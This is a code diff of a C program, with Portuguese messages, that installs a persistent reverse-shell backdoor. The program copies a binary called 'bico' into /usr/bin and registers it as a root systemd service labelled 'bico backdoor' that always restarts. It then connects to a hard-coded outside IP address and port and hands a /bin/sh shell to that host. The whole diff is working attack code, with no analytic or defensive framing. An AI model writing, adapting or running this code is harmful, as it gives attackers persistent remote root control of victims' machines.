@@ -6,63 +6,102 @@
 #include <arpa/inet.h>
 #include <string.h>
 
-int main() {
+#define BIN_PATH "/usr/bin/bico"
+#define SERVICE_PATH "/etc/systemd/system/bico.service"
+#define REMOTE_IP "54.232.216.110"
+#define REMOTE_PORT 16499
+
+int setup_socket(const char *ip, int port) {
     int sock;
     struct sockaddr_in addr;
-    char buffer;
-    const char *ip = "54.232.216.110"; // trocar ip
-    int port = 16499; // trocar porta
 
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
-        perror("Falha ao criar socket");
-        return 1;
+        perror("socket");
+        return -1;
     }
 
-    // Endereçamento
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
-    inet_pton(AF_INET, ip, &addr.sin_addr);
+
+    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) {
+        perror("inet_pton");
+        close(sock);
+        return -1;
+    }
 
     if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-        perror("Falha ao conectar");
-        return 1;
+        perror("connect");
+        close(sock);
+        return -1;
     }
 
-    // Caminho do binário
-    const char *bin_path = "/usr/bin/bico"; // Caminho onde o binário será copiado
+    return sock;
+}
 
-    // Copiar o binário para /usr/bin/
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "sudo cp ./bico /usr/bin/bico && sudo chmod +x /usr/bin/bico");
-    system(cmd);
-
-    // Criar o arquivo de serviço
-    FILE *file = fopen("/tmp/bico.service", "w");
-    if (file) {
-        fprintf(file, "[Unit]\nDescription=bico service\nAfter=network.target\n\n");
-        fprintf(file, "[Service]\nType=forking\nExecStart=%s\nRestart=always\nUser=root\nStandardOutput=journal\nStandardError=journal\nRestartSec=5\n\n", bin_path);
-        fprintf(file, "[Install]\nWantedBy=multi-user.target\n");
-        fclose(file);
-
-        // Mover o serviço para o diretório correto e configurar o systemd
-        system("sudo mv /tmp/bico.service /etc/systemd/system/bico.service");
-        system("sudo systemctl daemon-reload");
-        system("sudo systemctl enable bico.service");
-        system("sudo systemctl start bico.service");
-    } else {
-        perror("Erro ao criar o arquivo de serviço");
-        return 1;
+int install_binary() {
+    if (access("./bico", F_OK) != 0) {
+        fprintf(stderr, "Arquivo ./bico não encontrado\n");
+        return -1;
     }
 
-    // Redirecionar a entrada/saída para o socket
+    if (system("cp ./bico " BIN_PATH " && chmod +x " BIN_PATH) != 0) {
+        fprintf(stderr, "Falha ao instalar o binário\n");
+        return -1;
+    }
+
+    return 0;
+}
+
+int create_service_file() {
+    FILE *f = fopen("/tmp/bico.service", "w");
+    if (!f) {
+        perror("fopen");
+        return -1;
+    }
+
+    fprintf(f,
+        "[Unit]\n"
+        "Description=bico backdoor\n"
+        "After=network.target\n\n"
+        "[Service]\n"
+        "ExecStart=" BIN_PATH "\n"
+        "Restart=always\n"
+        "User=root\n"
+        "StandardOutput=journal\n"
+        "StandardError=journal\n"
+        "RestartSec=5\n\n"
+        "[Install]\n"
+        "WantedBy=multi-user.target\n"
+    );
+    fclose(f);
+
+    if (system("mv /tmp/bico.service " SERVICE_PATH) != 0 ||
+        system("systemctl daemon-reload") != 0 ||
+        system("systemctl enable bico.service") != 0 ||
+        system("systemctl start bico.service") != 0) {
+        fprintf(stderr, "Erro ao configurar o serviço\n");
+        return -1;
+    }
+
+    return 0;
+}
+
+void spawn_shell(int sock) {
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
-
-    // Executar shell
     execl("/bin/sh", "sh", NULL);
+}
 
+int main() {
+    if (install_binary() != 0) return 1;
+    if (create_service_file() != 0) return 1;
+
+    int sock = setup_socket(REMOTE_IP, REMOTE_PORT);
+    if (sock < 0) return 1;
+
+    spawn_shell(sock);
     return 0;
 }
